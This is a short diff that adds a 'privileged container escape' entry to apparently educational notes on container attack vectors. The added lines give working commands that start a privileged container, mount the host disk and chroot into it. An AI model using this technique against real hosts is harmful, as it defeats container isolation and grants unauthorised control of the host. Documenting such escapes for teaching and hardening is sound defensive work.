@@ -8,3 +8,14 @@ Containers share the host OS kernel — unlike virtual machines which have fully
 
 ```
 Key container attack vectors:
+
+1. Privileged Container Escape
+Running a container with --privileged flag gives it full host access
+Container can mount the host filesystem and escape entirely
+
+# Privileged container escape example
+docker run --privileged -it ubuntu bash
+# Inside the privileged container:
+mount /dev/sda1 /mnt    # mount host disk
+chroot /mnt             # change root to host filesystem
+# Now operating directly on the host OS
